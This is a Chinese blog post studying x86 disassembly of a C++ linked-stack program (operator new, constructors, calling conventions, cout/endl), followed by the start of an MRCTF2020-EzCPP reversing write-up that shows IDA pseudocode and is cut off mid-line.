<p>要么左下GE,函数返回了,其效果就相当于<code>malloc</code>一开始就开出来然后返回了</p>
<p>要么右下BE,还是开不出来,直接调用了<code>terminate()</code>终止了程序</p>
<p>GE结局有两种达成情况,一个是<code>___cxa_allocate_exception</code>又尝试了一次malloc,这次开出来了,直接GE</p>
<p>另一种达成清空是,这次又没开出来,两次malloc都没开出来,这时候进入了<code>loc_4C805C</code>,关键调用了一个<code>__ZN12_GLOBAL__N_14pool8allocateEj_constprop_0</code></p>
<p>反汇编这个函数看看吧,好家伙都用到了互斥锁,涉及进程安全性了,上网搜一下<code>pool_allocate</code>吧,说是内存池之类的东西.</p>
<p>这就需要学了CSAPP实现<code>malloc</code>和<strong>STL源码剖析</strong>再说了</p>
<p>本次对<code>operator new</code>的炎鸠就到此位置吧</p>
<p>回到<code>LinkedStack()</code>函数中</p>
<h5 id="mov-ebx-eax"><code>mov     ebx, eax</code></h5>
<p>如果能回来,说明new没有寄,那么eax中就是new在堆上开辟的对象的地址</p>
<p>这里eax将堆上对象的地址交给了ebx</p>
<h5
id="mov-dword-ptr-esp4-0"><code>mov     dword ptr [esp+4], 0</code></h5>
<p>本条指令以及后面的<code>mov     dword ptr [esp], 0</code>参数压栈,马上要调用函数了</p>
<p><code>mov     ecx, ebx</code></p>
<p>ebx将堆上对象的地址交给ecx,</p>
<p>可是不应该放在栈上head的地方吗?为啥要给ecx呢?</p>
<p>之前我们已经知道,ecx是用来存放当前对象的,其作用也就是this指针</p>
<p>那么后面啃腚要调用一个作用于当前对象的函数</p>
<p>刚才我们从<code>new</code>的逻辑中只能看到分配了空间,可是这片对空间并没有初始化,而<code>head = new LinkedNode();</code>这里调用了构造函数.</p>
<p>那么可以推测,马上就要调用<code>LinkedNode</code>的构造函数了</p>
<h5
id="call-__zn10linkednodec1eips_-linkednodelinkednodeintlinkednode"><code>call    __ZN10LinkedNodeC1EiPS_ ; LinkedNode::LinkedNode(int,LinkedNode*)</code></h5>
<p>果然如此,调用了LinkedNode构造函数,他有两个参数,都是4字节类型</p>
<p>并且我们没有在源代码显式地给他传参,而是使用的缺省参数(默认为0)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head = new LinkedNode();</span><br></pre></td></tr></table></figure>
<p>这也就解释了刚才压栈两个0是为啥了</p>
<p>跟踪一下<code>LinkedNode()</code>干了啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:00421FE8 ; Attributes: bp-based frame</span><br><span class="line">.text:00421FE8</span><br><span class="line">.text:00421FE8 ; LinkedNode::LinkedNode(int, LinkedNode*)</span><br><span class="line">.text:00421FE8 public __ZN10LinkedNodeC1EiPS_</span><br><span class="line">.text:00421FE8 __ZN10LinkedNodeC1EiPS_ proc near</span><br><span class="line">.text:00421FE8</span><br><span class="line">.text:00421FE8 var_4= dword ptr -4</span><br><span class="line">.text:00421FE8 arg_0= dword ptr  8</span><br><span class="line">.text:00421FE8 arg_4= dword ptr  0Ch</span><br><span class="line">.text:00421FE8</span><br><span class="line">.text:00421FE8 push    ebp</span><br><span class="line">.text:00421FE9 mov     ebp, esp</span><br><span class="line">.text:00421FEB sub     esp, 4</span><br><span class="line">.text:00421FEE mov     [ebp+var_4], ecx</span><br><span class="line">.text:00421FF1 mov     eax, [ebp+var_4]</span><br><span class="line">.text:00421FF4 mov     edx, [ebp+arg_0]</span><br><span class="line">.text:00421FF7 mov     [eax], edx</span><br><span class="line">.text:00421FF9 mov     eax, [ebp+var_4]</span><br><span class="line">.text:00421FFC mov     edx, [ebp+arg_4]</span><br><span class="line">.text:00421FFF mov     [eax+4], edx</span><br><span class="line">.text:00422002 nop</span><br><span class="line">.text:00422003 leave</span><br><span class="line">.text:00422004 retn    8</span><br><span class="line">.text:00422004 __ZN10LinkedNodeC1EiPS_ endp</span><br></pre></td></tr></table></figure>
<p>esp-4在栈上申请了4字节空间,然后存放ecx中的对象地址,然后过继给eax</p>
<p>arg_0是左边第一个参数,经过edx中转放到[eax]上,这个寄存器寻址,也就是对象的起始位置,也就是<code>int value</code>的位置</p>
<p>arg_4,第二个参数,经过edx中转放到[eax+4],也就是对象起始地址偏上4个字节,即第二个成员<code>LinkedNode *next</code>的地址</p>
<p><code>retn 8</code>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add esp, 8h</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>即函数尾声</p>
<blockquote>
<p>函数的局部变量就一个当前对象地址的拷贝,4个字节,这里为啥要退栈8字节呢?</p>
<p>退栈之前的栈帧状态:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LinkedStack的栈帧</span><br><span class="line">...</span><br><span class="line">参数2</span><br><span class="line">参数1</span><br><span class="line">LinkedNode()的栈帧</span><br><span class="line">返回值地址&lt;-ebp</span><br><span class="line">局部变量</span><br></pre></td></tr></table></figure>
<p>退栈后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参数2</span><br><span class="line">参数1</span><br></pre></td></tr></table></figure>
<p>显然是合理的,调用者LinkedStack清理参数</p>
</blockquote>
<p>也就是说LinkedNode()将堆上LinkedNode对象两个成员都置零</p>
<p>回到LinkedStack中</p>
<h5 id="sub-esp-8"><code>sub     esp, 8</code></h5>
<p>又申请了8字节的空间</p>
<h5 id="eax-ebpvar_c"><code>eax, [ebp+var_C]</code></h5>
<p>var_C是存放的LinkedStack对象的堆地址</p>
<p>这里将它交给eax,看来是马上对他读写了</p>
<h5 id="eax4-ebx"><code>[eax+4], ebx</code></h5>
<p>ebx是LinkedNode对象的堆地址,[eax+4]寄存器相对寻址,解引用之后是<code>LinkedStack</code>对象的第二个成员,即<code>LinkedNode *head</code></p>
<p>这里就是将head句柄落实了,让他指向了堆上的一片空间</p>
<h5 id="mov-ebx-ebpvar_4"><code>mov     ebx, [ebp+var_4]</code></h5>
<p>var_4是函数开端时被调用者保存的上级函数的ebx值</p>
<p>见函数开端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00422334 push    ebp</span><br><span class="line">.text:00422335 mov     ebp, esp</span><br><span class="line">.text:00422337 push    ebx</span><br></pre></td></tr></table></figure>
<p>现在本函数进入尾声了,要归还上级函数的ebx寄存器了,于是从栈里把他弹出来</p>
<h5 id="leave"><code>leave</code></h5>
<p>栈顶指针退回到本函数的帧指针处,帧指针重新指向上级函数的帧底</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq esp, ebp    # 使 rsp 和 rbp 指向同一位置，即子栈帧的起始处</span><br><span class="line">popq ebp	#弹出开端时压栈保存的上级函数帧指针</span><br></pre></td></tr></table></figure>
<h5 id="retn"><code>retn</code></h5>
<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0h</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>函数返回了</p>
<h4 id="从linkedstack回到main">从LinkedStack()回到main()</h4>
<p>从LinkedStack回来时标绿的部分执行完毕</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727002010882.png"
alt="image-20220727002010882" />
<figcaption aria-hidden="true">image-20220727002010882</figcaption>
</figure>
<h5 id="loc_401557"><code>loc_401557</code></h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401557 loc_401557:</span><br><span class="line">.text:00401557 mov     eax, [ebp+var_14]</span><br><span class="line">.text:0040155A cmp     eax, 0Ah</span><br><span class="line">.text:0040155D jg      short loc_40157D</span><br></pre></td></tr></table></figure>
<p>这里做了一个判断<code>var_14</code>是否为10</p>
<p>如果var_14&gt;10则跳转<code>loc_40157D</code></p>
<p>也就是右侧</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727002224727.png"
alt="image-20220727002224727" />
<figcaption aria-hidden="true">image-20220727002224727</figcaption>
</figure>
<p>否则执行左侧循环</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727002247712.png"
alt="image-20220727002247712" />
<figcaption aria-hidden="true">image-20220727002247712</figcaption>
</figure>
<p>左侧循环体中,<code>var_14</code>每次+1,显然是作为循环变量用的</p>
<p>对应到源代码是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    sta.push(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里var_14就是i,判断条件就是10</p>
<h5 id="循环体">循环体</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0040155F lea     eax, [ebp+var_10]</span><br><span class="line">.text:00401562 lea     edx, [ebp+var_14]</span><br><span class="line">.text:00401565 mov     [esp], edx      ; this</span><br><span class="line">.text:00401568 mov     ecx, eax</span><br><span class="line">.text:0040156A call    __ZN11LinkedStack4pushERKi ; LinkedStack::push(int const&amp;)</span><br><span class="line">.text:0040156F sub     esp, 4</span><br><span class="line">.text:00401572 mov     eax, [ebp+var_14]</span><br><span class="line">.text:00401575 add     eax, 1</span><br><span class="line">.text:00401578 mov     [ebp+var_14], eax</span><br><span class="line">.text:0040157B jmp     short loc_401557</span><br></pre></td></tr></table></figure>
<p>var_10的地址放到eax中,var_10中存放的是什么,在调用LinkedStack()之前该值被作为唯一的参数传递给LinkedStack,显然是this指针,那么var_10存放的就是LinkedStack对象的首地址</p>
<p>var_14的地址放到edx中,var_14是循环变量,也是每次循环时将要被压入LinkedStack的值</p>
<p><code>mov     [esp], edx</code>将要压入LinkedStack的值先放到栈顶,作为参数传递</p>
<p><code>ecx, eax</code>用ecx承载LinkedStack对象地址,这是调用约定,马上就要调用成员函数了</p>
<p><code>call    __ZN11LinkedStack4pushERKi ; LinkedStack::push(int const&amp;)</code></p>
<p>该函数的唯一一个参数已经被刚才<code>mov     [esp], edx</code>放到栈顶了</p>
<p>该函数的细节就不需要步入跟踪了,放一张截图,反汇编写的已经很明白了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727003212521.png"
alt="image-20220727003212521" />
<figcaption aria-hidden="true">image-20220727003212521</figcaption>
</figure>
<h5 id="跳出循环体">跳出循环体</h5>
<p>当var_14也就是i=11,超过10的时候,跳出了循环</p>
<p>进入<code>loc_40157D</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727004848001.png"
alt="image-20220727004848001" />
<figcaption aria-hidden="true">image-20220727004848001</figcaption>
</figure>
<p>这里面大多数逻辑或者类似逻辑都已经炎鸠过了还差一个<code>cout&lt;&lt;</code>这个玩意儿</p>
<p>下面炎鸠一下这个怎么实现的</p>
<h5 id="stdcout">std::cout</h5>
<p>源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; sta.length() &lt;&lt; endl;</span><br></pre></td></tr></table></figure>
<p>反汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0040157D lea     eax, [ebp+var_10]	;var_10,LinkedStack对象</span><br><span class="line">.text:00401580 mov     ecx, eax				;var_10经过eax中转放到ecx,为了遵守调用约定</span><br><span class="line">.text:00401582 call    __ZNK5Stack6lengthEv ; Stack::length(void)</span><br><span class="line">.text:00401587 mov     [esp], eax</span><br><span class="line">.text:0040158A mov     ecx, offset __ZSt4cout ; std::cout</span><br><span class="line">.text:0040158F call    __ZNSolsEi      ; std::ostream::operator&lt;&lt;(int)</span><br></pre></td></tr></table></figure>
<p>length函数的返回值放在eax中然后放到栈顶,准备参数</p>
<p>然后把<code>__ZSt4cout</code>的地址放到ecx中,显然作为对象传递</p>
<p>然后调用了__ZNSolsEi,即operator&lt;&lt;函数,打印了length</p>
<p>本函数执行之后,终端上已经打印出10了</p>
<p>可是后来貌似还打印了一些东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401594 sub     esp, 4</span><br><span class="line">.text:00401597 mov     dword ptr [esp], offset __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_ ; this</span><br><span class="line">.text:0040159E mov     ecx, eax</span><br><span class="line">.text:004015A0 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br></pre></td></tr></table></figure>
<p>又压栈了一个<code>__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_</code>的地址作为参数</p>
<p>这是个啥呢?跟踪它,IDA给出的注释是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ostream *__cdecl <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(<span class="built_in">std</span>::ostream *__os)</span><br></pre></td></tr></table></figure>
<p>原来是endl,它原来是个函数(函数模板)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ostream *__cdecl <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(<span class="built_in">std</span>::ostream *__os)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *v5)(<span class="type">char</span>); <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+4h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_DWORD *)(*(_DWORD *)__os - <span class="number">12</span>);</span><br><span class="line">  v2 = *(_BYTE **)((<span class="type">char</span> *)__os + v1 + <span class="number">124</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="built_in">std</span>::__throw_bad_cast();</span><br><span class="line">  <span class="keyword">if</span> ( v2[<span class="number">28</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">char</span>)v2[<span class="number">39</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(_DWORD *)((<span class="type">char</span> *)__os + v1 + <span class="number">124</span>));</span><br><span class="line">    v5 = *(<span class="type">int</span> (__stdcall **)(<span class="type">char</span>))(*(_DWORD *)v2 + <span class="number">24</span>);</span><br><span class="line">    v3 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="built_in">std</span>::ctype&lt;<span class="type">char</span>&gt;::do_widen )</span><br><span class="line">      v3 = ((<span class="type">char</span> (__thiscall *)(_BYTE *, <span class="type">int</span>))v5)(v2, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::ostream::put((<span class="built_in">std</span>::ostream *)v3, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::ostream::flush(__os);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数的参数类型为<code>std::ostream *__os</code>,此os不是操作系统的缩写,而是ostream唯一的一个标准输出对象<code>cout</code></p>
<p>至于cout,endl,ostream都长啥样,干了啥,现在不做炎鸠,留作后话吧</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/xiaofei0859/article/details/78452510">C++中endl的本质是什么_xiaofei0859的博客-CSDN博客_c++
endl</a></p>
<p>为啥可以<code>cout.operator&lt;&lt;(endl);</code>这样调用,endl不是一个函数吗?</p>
<p>显然ostream类中有对<code>operator&lt;&lt;(endl)</code>的重载函数,咋重载的现在不想了解</p>
<h2 id="总结">总结</h2>
<h4 id="调用约定">调用约定</h4>
<p>参数使用栈传递,从右向左压栈,栈顶是最左的参数</p>
<p>this指针使用ecx寄存器传递,成员函数的其他参数使用栈传递</p>
<p>成员函数返回值使用eax传递</p>
<p>成员函数的 调用和普通函数几乎没有区别,就多一个一个ecx传递对象指针</p>
<h4 id="new和构造函数的关系">new和构造函数的关系</h4>
<p>它俩不存在谁调用谁的关系,调用者函数首先调用operator
new函数在堆上申请空间,然后调用者接着调用构造函数初始化这片空间</p>
<h4 id="new的工作细节">new的工作细节</h4>
<p>在operator
new执行之前,调用者会把new应当申请多大空间,写到栈上,这个位置后来还得存放new返回的句柄</p>
<p>new不需要知道开辟空间是为了干什么,只需要一个大小参数</p>
<p>new会调用malloc函数,如果malloc开不出来则尝试调用get_new_handle即用户自定义的处理函数.</p>
<p>如果用户没有定义该函数则走默认的流程,</p>
<p>这个默认的流程还没有全炎鸠明白</p>
<h4 id="构造函数的工作细节">构造函数的工作细节</h4>
<p>反汇编视角下的构造函数和普通的成员函数没有区别,都是使用ecx表示当前对象地址,或者说new在堆上开出的地址</p>
<p>构造函数通过ecx拿到堆上的一片地址后,构造函数就认为这里就是我要进行初始化的对象,构造函数才不会管这片空间够不够大</p>
<p>因此</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    Test *a=(Test*)new int;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种代码也是可以通过编译的,但是new只在堆上开了一个int的大小即4字节,显然放不开一个8字节的Test</p>
<p>但是编译器不知道,程序运行的时候也不知道,这就发生了类似数组访问越界的行为.Test.y成员写到堆上的位置是没有申请的空间,下一次申请堆空间就会覆盖掉这个地址</p>
<h2 id="mrctf2020-ezcpp">MRCTF2020-EzCPP</h2>
<h3 id="main函数">main函数</h3>
<p>ida给出的反编译伪代码真的是老太太的裹脚--又臭又长</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// bl</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+28h] [rbp-118h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+3Ch] [rbp-104h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">48</span>]; <span class="comment">// [rsp+60h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v20[<span class="number">31</span>]; <span class="comment">// [rsp+90h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+AFh] [rbp-91h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">47</span>]; <span class="comment">// [rsp+B0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [rsp+DFh] [rbp-61h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v24[<span class="number">36</span>]; <span class="comment">// [rsp+E0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [rsp+104h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// [rsp+108h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// [rsp+110h] [rbp-30h]</span></span><br><span class="line">  _DWORD *v28; <span class="comment">// [rsp+118h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> *v29; <span class="comment">// [rsp+120h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+12Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt;::<span class="built_in">vector</span>(v20, argv, envp);</span><br><span class="line">  std::vector&lt;<span class="type">bool</span>&gt;::<span class="built_in">vector</span>(v19);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v21);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v18, &amp;unk_500E, &amp;v21);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v21);</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;give me your key!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;keys[i]);</span><br><span class="line">    std::__cxx11::<span class="built_in">to_string</span>((std::__cxx11 *)v22, keys[i]);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>+=(v18, v22);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v22);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = keys;</span><br><span class="line">  v29 = keys;</span><br><span class="line">  v27 = (<span class="type">int</span> *)&amp;unk_<span class="number">83E4</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v29 != v27 )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = *v29;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt;::<span class="built_in">push_back</span>(v20, &amp;v17);</span><br><span class="line">    ++v29;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = std::vector&lt;std::shared_ptr&lt;SQLStorage::AddUpdateTable&gt;&gt;::<span class="built_in">end</span>(v20);</span><br><span class="line">  v5 = fmt::v6::internal::get_container&lt;fmt::v6::internal::buffer&lt;<span class="type">char</span>&gt;&gt;(v20);</span><br><span class="line">  std::for_each&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;&gt;,boost::unit_test::output::s_replace_chars&gt;(</span><br><span class="line">    v5,</span><br><span class="line">    v4);</span><br><span class="line">  v26 = v20;</span><br><span class="line">  v16 = fmt::v6::internal::get_container&lt;fmt::v6::internal::buffer&lt;<span class="type">char</span>&gt;&gt;(v20);</span><br><span class="line">  v15 = std::vector&lt;std::shared_ptr&lt;SQLStorage::AddUpdateTable&gt;&gt;::<span class="built_in">end</span>(v26);</span><br><span 